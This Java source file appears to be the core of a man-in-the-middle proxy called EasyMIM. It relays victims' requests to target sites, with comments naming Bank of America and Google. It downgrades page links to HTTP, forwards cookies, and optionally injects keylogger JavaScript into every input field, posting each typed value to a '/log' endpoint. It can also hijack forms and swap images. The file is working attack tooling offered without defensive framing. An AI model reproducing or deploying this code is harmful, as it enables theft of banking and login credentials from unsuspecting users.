package Server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.jsoup.*;
import org.jsoup.nodes.*;
import org.jsoup.nodes.Document.OutputSettings;
import org.jsoup.nodes.Entities.EscapeMode;
import org.jsoup.select.Elements;

import Models.ClientInfo;
import Models.EasyMIMConfig;
import Models.RequestInfo;


public class WebsiteProcessor {
	private final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36";
	public enum Protocol{HTTP,HTTPS};
	public EasyMIMConfig config;
	
	public WebsiteProcessor() {
		this.config = new EasyMIMConfig();
		// TODO Auto-generated constructor stub
	}
	public WebsiteProcessor(EasyMIMConfig config) {
		// TODO Auto-generated constructor stub
		this.config = config;
	}
	public void processRequest(HttpServletRequest request, HttpServletResponse response, ClientInfo ci) throws IOException{
		ci.setBase(request.getParameter("url"));
		String html = "";
		String[] protocols = {"https://","http://"};
		RequestInfo ri = new RequestInfo();
		String url = "";
		int i=0;
		while(html.equals("") && i<2){
			String endPoint = request.getRequestURI();
			url = protocols[i]+ci.getBase()+endPoint;
			
			String query = request.getQueryString();
			if(query!=null && !query.equals("null")){
				url+="?"+query;
			}
			ri.url = url;
			try {
				html = getRawResponseAndSetBasic(ri,"GET",request,response,ci);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				//e.printStackTrace();
			}
			i++;
		}
		//redirect if not targeted
		if(!config.targetURL.contains(ci.getBase())){
			System.out.println(url);
			response.sendRedirect(url);
			return;
		}
		String modifiedHtml = processHTML(ri, html, url.contains(".js"),ci);
		response.getWriter().write(modifiedHtml);
	}
	public String processHTML(RequestInfo ri, String html,boolean isJS,ClientInfo ci){
		String html1 = html;
		
		if(isJS){
			return html1;
		}
		Document doc = Jsoup.parse(html1);
		
		//add jquery
		doc.head().prepend("<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>");
		Element iconHeader = doc.select("meta[itemprop]").first();
		if(iconHeader!=null && iconHeader.attr("content")!=null){
			doc.head().prepend("<link rel='shortcut icon' href='"+"http://"+ci.getBase()+iconHeader.attr("content")+"'>");
		}
		//downgrade all src href links to http
		Elements links = doc.select("img");
		links.addAll(doc.select("input"));
		links.addAll(doc.select("form"));
		for(Element l:links){
			String imgSrc = l.attr("src");
			if(!imgSrc.contains("//")){
				imgSrc = "http://"+ci.getBase()+imgSrc;
			}
			l.attr("src", imgSrc);
		}
		/*Needed for Bank of America*/
		Elements boas = doc.select("div[data-fallback]");
		for(Element boa:boas){
			boa.attr("data-mboxer", "");
			String dataF = boa.attr("data-fallback");
			Pattern p = Pattern.compile("src=\"");
			Matcher m = p.matcher(dataF);
			dataF=m.replaceAll("src=\"http://"+ci.getBase());
			boa.append(dataF);
		}
		/*Needed for Bank of America*/
		/*Needed for Bank of google*/
		Elements googs = doc.select("#lang-chooser-wrap");
		for(Element goog:googs){
			goog.html("");
		}
		//keylogger code
		if(config.keylogger){
			addKeylogger(ri,doc);
		}
		//popup message
		if(config.popUpMessage!=null && !config.popUpMessage.equals("")){
			addPopUpMessage(ri,doc);
		}
		//replace image
		if(config.imageURL!=null && !config.imageURL.equals("")){
			changeAllImages(ri,doc);
		}
		return doc.toString();
	}
	private void changeAllImages(RequestInfo ri, Document doc) {
		Elements images = doc.select("img");
		for(Element image:images){
			image.attr("src",config.imageURL);
		}
	}
	private void addPopUpMessage(RequestInfo ri, Document doc) {
		String msg = config.popUpMessage.replaceAll("'", "\\\\'");
		msg = msg.replaceAll("\"", "\\\\\"");
		Elements forms = doc.select("form");
		for(Element form:forms){
			form.attr("action","");
		}
		Elements buttons = doc.select("input[type=submit]");
		buttons.addAll(doc.select("input[type=button]"));
		buttons.addAll(doc.select("button"));
		for(Element button:buttons){
			String clickEventHandler = "alert('"+msg+"');";
			button.attr("onclick",clickEventHandler);
		}
	}
	private void addKeylogger(RequestInfo ri,Document doc){
		Elements inputs = doc.select("input");
		for(Element input:inputs){
			if(input.attr("id")!=null && !input.attr("id").equals("")){
				String keyString ="'"+input.attr("id")+"'";
				String valueString = "$('#"+input.attr("id")+"').val()";
				String var = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+"};";
				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
				var+
				ajaxString+
				"}) </script>";
				doc.append(complete);
			}
		}
	}
	public String getRawResponseAndSetBasic(RequestInfo ri,String method,HttpServletRequest request, HttpServletResponse response,ClientInfo ci) throws IOException{
		String link = ri.url;
		URL u = new URL(link);
		HttpURLConnection  conn = (HttpURLConnection) u.openConnection();
		conn.setReadTimeout(1000);
		conn.setRequestMethod(method);
		conn.setUseCaches(false);
		Map<String, String[]> params = request.getParameterMap();
		for(String key:params.keySet()){
			conn.addRequestProperty(key, params.get(key)[0]);
		}
		if(method.equals("POST")){
			conn.setDoOutput(true);
		}
		conn.setDefaultUseCaches(false);
		conn.setInstanceFollowRedirects( true );
		conn.setRequestProperty("User-Agent", USER_AGENT);
		conn.setRequestProperty("Accept",
			"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
		if (ci.getCookies() != null) {
			for (String cookie : ci.getCookies()) {
				conn.addRequestProperty("Cookie", cookie.split(";", 1)[0]);
			}
		}
		conn.connect();
        
		if(conn.getResponseCode()!=200){
			throw new IOException("Page was not retrieved correctly!");
		}
		
        OutputStreamWriter wr = null;
        BufferedReader rd  = null;
        String line = null;
        StringBuilder sb = new StringBuilder();
        if(method.equals("POST")){
	       wr = new OutputStreamWriter(conn.getOutputStream());
	       wr.write("something");
	       wr.flush();
        }
        
        //read the result from the server
        rd  = new BufferedReader(new InputStreamReader(conn.getInputStream(),Charset.availableCharsets().get("UTF-8")));
        
      
        while ((line = rd.readLine()) != null)
        {
            sb.append(line + '\n');
        }
        //copy cookie data
        
        return sb.toString();
	}
	public static <Q> String concatenate(Iterable<Q> i, String linkSymbol){
		String out = "";
		Iterator<Q> p = i.iterator();
		while(p.hasNext()){
			String strToAdd = p.next().toString();
			if(!strToAdd.equals("") && strToAdd!=null){
				out+=strToAdd;
				if(p.hasNext()){
					out+=" "+linkSymbol+" ";
				}
			}
		}
		return out;
	}
}
